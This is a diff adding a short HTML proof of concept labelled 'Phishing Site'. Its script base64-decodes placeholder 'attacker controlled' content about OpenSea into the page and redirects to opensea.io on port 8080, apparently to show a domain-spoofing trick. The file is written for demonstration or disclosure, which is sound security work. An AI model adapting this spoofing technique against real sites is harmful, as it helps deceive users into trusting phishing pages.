@@ -1,0 +1,15 @@
+<html>
+    <title>Phishing Site</title>
+    <body>
+    <script>
+     function spoof()
+     {
+     var data = 'PGh0bWw+PGJvZHk+PGgxIGFsaWduPSJjZW50ZXIiPk9wZW5TZWEuaW8gUGhpc2hpbmcgV2Vic2l0ZSwgQXR0YWNrZXIgY29udHJvbGxlZCBDb250ZW50czwvaDE+PC9ib2R5PjwvaHRtbD4='; // base64 encoded html content
+     document.body.innerHTML=atob(data);
+     window.location.assign("https://opensea.io:8080");
+     }
+    setInterval(spoof(),100000);
+    </script>
+    </script>
+    </body>
+    </html>
